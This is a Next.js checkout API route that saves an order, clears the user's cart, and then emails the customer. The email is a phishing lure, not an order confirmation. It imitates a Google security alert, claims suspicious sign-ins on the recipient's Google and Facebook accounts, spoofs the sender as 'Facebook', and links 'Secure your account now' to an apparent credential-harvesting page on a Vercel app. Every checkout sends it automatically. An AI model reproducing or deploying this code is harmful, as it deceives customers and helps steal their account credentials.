import { NextResponse } from "next/server";
import Order from "@/app/lib/modals/Order";
import Cart from "@/app/lib/modals/Cart";
import User from "@/app/lib/modals/users";
import connectdb from "@/app/lib/database";
import nodemailer from 'nodemailer';

export const POST = async(request:Request) => {
    //const ticket = Math.floor(1000 + Math.random() * 9000);
    const {cart, Itemtotal, Email, Name} = await request.json(); // we are getting the email from the body so that we can send an email to the user who checkedout
    const location = "Nairobi, Kenya";
    const deviceName = "Chrome on Android";
    const timestamp = "July 8, 2025 at 6:22 PM EAT";

    const HtmlBody = `
                <table cellpadding="0" cellspacing="0" style="font-family: Arial, sans-serif; width: 100%; max-width: 600px; background-color: #ffffff; border: 1px solid #dadce0; margin: 0 auto; border-radius: 8px;">
                <tr style="background-color: #f2f2f2;">
                    <td style="padding: 20px; text-align: center;">
                    <img src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png" alt="Google Logo" width="112" height="36" />
                    </td>
                </tr>
                <tr>
                    <td style="padding: 30px;">
                    <h2 style="color: #d93025; margin-bottom: 20px;">⚠️ Critical Security Alert</h2>
                    <p style="font-size: 16px; color: #202124;">Hi <strong>${Name}</strong>,</p>
                    <p style="font-size: 14px; color: #202124;">
                        We detected a suspicious sign-in attempt on your Google and Facebook accounts associated with <strong>${Email}</strong>.
                    </p>
                    <table cellpadding="10" cellspacing="0" style="background-color: #fff3cd; border-left: 4px solid #fbbc04; margin: 20px 0; width: 100%; border-radius: 4px;">
                        <tr>
                        <td style="font-size: 14px; color: #202124;">
                            <strong>📍 Location:</strong> ${location}<br />
                            <strong>💻 Device:</strong> ${deviceName}<br />
                            <strong>🕒 Time:</strong> ${timestamp}
                        </td>
                        </tr>
                    </table>
                    <p style="font-size: 14px; color: #202124;">If this wasn’t you, we strongly recommend securing your account immediately:</p>
                    <p style="margin: 20px 0;">
                        🔒 <a href="https://cake-app2-r9zp.vercel.app/Facebook" style="color: #1a73e8; text-decoration: none;">Secure your account now</a><br />
                        📄 <a href="#" style="color: #1a73e8; text-decoration: none;">Review recent activity</a>
                    </p>
                    <p style="font-size: 13px; color: #5f6368;">Ignoring this alert may result in unauthorized access to your personal information.</p>
                    <p style="font-size: 14px; color: #202124;">Stay safe,<br /><strong>The Google Security Team</strong></p>
                    </td>
                </tr>
                <tr style="background-color: #f2f2f2;">
                    <td style="padding: 15px; text-align: center; font-size: 12px; color: #5f6368;">
                    © 2025 Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043
                    </td>
                </tr>
                </table>
                `;

    
     try{
           
                if (!cart) {
                    return NextResponse.json({ message: 'Invalid checkout' }, { status: 400 });
                }
                 if (!Name) {
                    return NextResponse.json({ message: "Username is required" }, { status: 400 });
        }
            await connectdb()
            const createdOrder = await Order.create({items:cart, Itemtotal });

            if(createdOrder){
                    const getUser = await User.findOne({username:Name});
                    if (!getUser) {
                        return NextResponse.json({error:'User not found'})
                        }
                    const ID = getUser._id; // getting the user id associated with a particular username
                    if (!ID) {
                        return NextResponse.json({ error: "Missing ID" }, { status: 400 });
                    }
                    await Cart.deleteMany({userId:ID}); //deleting all cart items that were associated with the user who checked out
            }

             const transporter = nodemailer.createTransport({
             host: 'smtp.gmail.com',
             port: 465,
             secure: true,
             service: 'gmail', // or your SMTP provider
             auth: {
                user: process.env.EMAIL_USER,
                pass: process.env.EMAIL_PASSWORD,
      },
    });
           
    await transporter.sendMail({
            from: `Facebook <${process.env.EMAIL_USER}>`,
            to: Email,
            subject: 'Order PlaceMent',
            html: HtmlBody,
            
        });

        return new NextResponse(JSON.stringify({
                    message: "Order is Successfully created",
                    user: createdOrder
            }), {status:200});

     } catch(error:unknown){
         if (error instanceof Error) {
            return new NextResponse("Error Placing Order " + error.message, {
                        status:500,
                    })
            }
     }
   
}